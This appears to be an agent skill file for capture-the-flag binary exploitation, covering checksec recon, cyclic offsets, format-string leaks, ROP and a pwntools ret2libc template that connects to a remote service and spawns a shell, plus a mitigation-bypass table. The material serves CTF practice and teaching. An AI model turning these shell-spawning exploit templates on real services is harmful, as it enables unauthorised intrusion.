# Binary Exploitation

Covers memory corruption and format-string bugs against local binaries and remote services.

## Triggers

A binary paired with a remote service (`nc <host> <port>`); source code or description hints at overflow or format string; challenge says "get a shell"; a libc is provided alongside the binary.

## Workflow

1. Run checksec to enumerate mitigations.
2. Find the bug (buffer overflow, format string, heap, etc.).
3. Craft the input: determine offset, build payload.
4. Leak a runtime address if ASLR/PIE is enabled.
5. Chain the exploit to gain shell or direct flag read.

## Commands

Run these via the kali skill (it owns host/auth):

**Recon**
```bash
checksec --file=<bin>
file <bin>
# Identify libc version
strings <bin> | grep -i libc
ldd <bin>
```

**Find offset**
```bash
# Generate cyclic pattern
pwn cyclic 200
# Run binary, crash, read the value in rsp/eip, then:
pwn cyclic -l <value>
```

**Classic buffer overflow**
```bash
# Overwrite return address to win() or system("/bin/sh")
python3 -c "
from pwn import *
p = process('./<bin>')
offset = <offset>
win = <win_addr>
payload = b'A' * offset + p64(win)
p.sendline(payload)
p.interactive()
"
```

**Format string**
```bash
# Leak stack values
python3 -c "print('%p.' * 20)" | ./<bin>
# Write to a GOT entry (%n)
# Use pwntools fmtstr_payload for automated writes
```

**ROP chain (NX enabled)**
```bash
# Find gadgets
ROPgadget --binary <bin>
python3 -c "
from pwn import *
elf = ELF('<bin>')
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')
# ... build ret2libc chain after leak
"
```

**pwntools exploit template**
```python
from pwn import *

elf = ELF('./<bin>')
libc = ELF('./<libc>')       # use the provided libc
context.binary = elf

p = remote('<host>', <port>)  # or: p = process('./<bin>')

offset = <offset>

# --- Stage 1: leak a libc address ---
payload = b'A' * offset
# add ROP gadgets to call puts(got['puts']) then return to main
p.sendlineafter(b'> ', payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']

# --- Stage 2: ret2libc ---
ret    = ROP(elf).find_gadget(['ret'])[0]       # stack alignment
system = libc.sym['system']
binsh  = next(libc.search(b'/bin/sh'))
payload2 = b'A' * offset + p64(ret) + p64(binsh) + p64(system)
# (adjust ROP chain to match binary ABI)
p.sendlineafter(b'> ', payload2)

p.interactive()
```

**Mitigation cheat sheet**

| Mitigation | Bypass |
|------------|--------|
| NX | ROP / ret2libc |
| Canary | Leak it via format string or partial overwrite |
| PIE/ASLR | Leak an address, compute base at runtime |
| Partial RELRO | GOT overwrite possible |
| Full RELRO | GOT overwrite blocked — target other writable areas |

## Pitfalls

- Libc mismatch causes wrong offsets — use the provided libc with `LD_PRELOAD=./<libc> ./<bin>`.
- Bad-char bytes (null, newline) in the payload can truncate it — check what `read`/`gets` stops at.
- `system("/bin/sh")` requires 16-byte stack alignment (movaps) — prepend a `ret` gadget.
- Off-by-one on the cyclic offset is common — double-check with gdb before sending remotely.

## Flag extraction

Once a shell is obtained:
```bash
cat flag.txt
find / -name 'flag*' 2>/dev/null
```

Some services print the flag directly after a successful exploit without dropping to an interactive shell — read all output before calling `interactive()`.
